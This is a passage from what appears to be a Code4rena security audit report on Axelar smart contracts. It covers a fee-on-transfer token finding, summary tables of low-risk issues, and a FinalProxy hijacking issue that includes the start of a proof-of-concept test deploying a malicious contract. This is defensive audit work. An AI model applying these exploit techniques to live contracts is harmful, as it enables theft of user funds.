class=\"mtk7\">452</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">453</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_setExpressReceiveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">caller</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">454</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L482-L482\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L482-L482</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">467</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expressReceiveTokenWithData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">468:         </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">469:         </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">470:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">471:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">472:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">473:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">474:         </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">commandId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">475</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">476</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isCommandExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">477</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">478</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">caller</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">479</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">ITokenManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ITokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getValidTokenManagerAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">480</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">481</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">482</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">SafeTokenTransferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">caller</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// &lt;= FOUND</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">483</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">484</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_expressExecuteWithInterchainTokenToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">485</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">486</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_setExpressReceiveTokenWithData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">caller</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">487</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><strong><a href=\"https://gist.github.com/thebrittfactor/c400e0012d0092316699c53843ecad41?permalink_comment_id=4761447#gistcomment-4761447\">deanamiel (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>Invalid, we have a dedicated token manager for fee-on-transfer tokens that takes this into account. <a href=\"https://github.com/axelarnetwork/interchain-token-service/blob/main/contracts/token-manager/TokenManagerLockUnlockFee.sol\">Here</a> is TokenManagerLockUnlockFee for reference.</p>\n</blockquote>\n<p><strong><a href=\"https://gist.github.com/thebrittfactor/c400e0012d0092316699c53843ecad41?permalink_comment_id=4767850#gistcomment-4767850\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Agree with the sponsor that there is a special token manager for such fee-on-transfer tokens. However, the identified instances in the report are still affected by the issue. Consequently, I consider Medium severity to be appropriate.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 15 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/353\">report highlighted below</a> by <strong>immeas</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/94\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/490\">naman1778</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/471\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/465\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/329\">matrix_0wl</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/324\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/301\">banpaleo5</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/297\">MohammedRizwan</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/295\">Emmanuel</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/270\">hals</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/151\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/77\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/40\">DavidGiladi</a>, and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/31\">Sathish9098</a>.</em></p>\n<h2 id=\"low-issue-summary\" style=\"position:relative;\"><a href=\"#low-issue-summary\" aria-label=\"low issue summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Issue Summary</h2>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Title</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[L-01]</td>\n<td><code>FinalProxy</code> can be hijacked by vulnerable implementation contract</td>\n</tr>\n<tr>\n<td>[L-02]</td>\n<td>A users tokens can be stolen if they don’t control <code>msg.sender</code> address on all chains</td>\n</tr>\n<tr>\n<td>[L-03]</td>\n<td>No event emitted when a vote is cast in <code>MultisigBase</code></td>\n</tr>\n<tr>\n<td>[L-04]</td>\n<td><code>InterchainTokenService</code> non-remote deploy calls accept <code>eth</code> but are not using it</td>\n</tr>\n<tr>\n<td>[L-05]</td>\n<td>Default values for <code>deployAndRegisterStandardizedToken</code> can make it complicated for third party implementers</td>\n</tr>\n<tr>\n<td>[L-06]</td>\n<td><code>InterchainTokenServiceProxy</code> is <code>FinalProxy</code></td>\n</tr>\n<tr>\n<td>[L-07]</td>\n<td>Low level <code>call</code> will always succeed for non existent addresses</td>\n</tr>\n<tr>\n<td>[L-08]</td>\n<td><code>InterchainTokenService::getImplementation</code> returns <code>address(0)</code> for invalid types</td>\n</tr>\n<tr>\n<td>[L-09]</td>\n<td>Consider a two way transfer of governance</td>\n</tr>\n<tr>\n<td>[L-10]</td>\n<td>Consider a two way transfer of <code>operator</code> and <code>distributor</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"suggested-issue-summary\" style=\"position:relative;\"><a href=\"#suggested-issue-summary\" aria-label=\"suggested issue summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Suggested Issue Summary</h2>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Title</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[S-01]</td>\n<td>Consider adding a version to upgradable contracts</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"refactor-issue-summary\" style=\"position:relative;\"><a href=\"#refactor-issue-summary\" aria-label=\"refactor issue summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Refactor Issue Summary</h2>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Title</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[R-01]</td>\n<td><code>sourceAddress</code> means two different things in <code>InterchainTokenService</code></td>\n</tr>\n<tr>\n<td>[R-02]</td>\n<td><code>InterchainTokenService::_validateToken</code> could have a more descriptive name</td>\n</tr>\n<tr>\n<td>[R-03]</td>\n<td><code>AxelarGateway::onlyMintLimiter</code> could have a more descriptive name</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"non-criticalinformational-issue-summary\" style=\"position:relative;\"><a href=\"#non-criticalinformational-issue-summary\" aria-label=\"non criticalinformational issue summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical/Informational Issue Summary</h2>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Title</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[N-01]</td>\n<td><code>RemoteAddressValidator::_lowerCase</code> will not work for Solana addresses</td>\n</tr>\n<tr>\n<td>[N-02]</td>\n<td><code>InterchainGovernance</code> can be <code>abstract</code></td>\n</tr>\n<tr>\n<td>[N-03]</td>\n<td><code>eta</code> in <code>ProposalCancelled</code> event can be misleading</td>\n</tr>\n<tr>\n<td>[N-04]</td>\n<td>Incomplete NatSpec</td>\n</tr>\n<tr>\n<td>[N-05]</td>\n<td>Erroneous comments</td>\n</tr>\n<tr>\n<td>[N-06]</td>\n<td>Typos and misspellings</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"l-01-finalproxy-can-be-hijacked-by-vulnerable-implementation-contract\" style=\"position:relative;\"><a href=\"#l-01-finalproxy-can-be-hijacked-by-vulnerable-implementation-contract\" aria-label=\"l 01 finalproxy can be hijacked by vulnerable implementation contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] <code>FinalProxy</code> can be hijacked by vulnerable implementation contract</h2>\n<p><code>FinalProxy</code> is a proxy that can be upgraded, but if <code>owner</code> calls <code>finalUpgrade</code> it will <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/gmp-sdk/upgradable/FinalProxy.sol#L79-L83\">deploy the final upgrade using <code>Create3</code></a> and it can no longer be upgraded. To determine if it has gotten the final upgrade or not, the function <code>_finalImplementation</code> is called:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/gmp-sdk/upgradable/FinalProxy.sol#L18\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/gmp-sdk/upgradable/FinalProxy.sol#L18</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/gmp-sdk/upgradable/FinalProxy.sol#L57-L64\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/gmp-sdk/upgradable/FinalProxy.sol#L57-L64</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">gmp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">sdk</span><span class=\"mtk1\">/</span><span class=\"mtk12\">upgradable</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FinalProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FINAL_IMPLEMENTATION_SALT</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;final-implementation&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_finalImplementation</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">implementation_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">59:         * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Computing the address is cheaper than using storage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">60:         */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">implementation_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Create3</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployedAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">FINAL_IMPLEMENTATION_SALT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">implementation_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">code</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">implementation_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>The issue is that if the implementation supports deploying with <code>Create3</code>, a user could use the salt (<code>keccak256('final-implementation')</code>) and deploy a final implementation without calling <code>finalImplementation</code>, since <code>Create3</code> only uses <code>msg.sender</code> and <code>salt</code> to determine the address.</p>\n<p><code>InterchainTokenService</code>, which is the only implementation in scope using <code>FinalProxy</code>, does however not appear to be vulnerable to this, since all the salts used for deploys are calculated, not supplied. But future implementations/other contracts using <code>FinalProxy</code> might be.</p>\n<h3 id=\"poc\" style=\"position:relative;\"><a href=\"#poc\" aria-label=\"poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PoC</h3>\n<p>Test in <code>proxy.js</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;vulnerable FinalProxy implementation&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vulnerableDeployerFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;VulnerableDeployer&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maliciousContractFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;MaliciousContract&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vulnerableImpl</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vulnerableDeployerFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">().</span><span class=\"mtk11\">then</span><span class=\"mtk1\">((</span><span class=\"mtk12\">d</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployed</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finalProxyFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vulnerableImpl</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;0x&#39;</span><span class=\"mtk1\">).</span><span class=\"mtk11\">then</span><span class=\"mtk1\">((</span><span class=\"mtk12\">d</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployed</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isFinal</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vulnerable</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Contract</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span 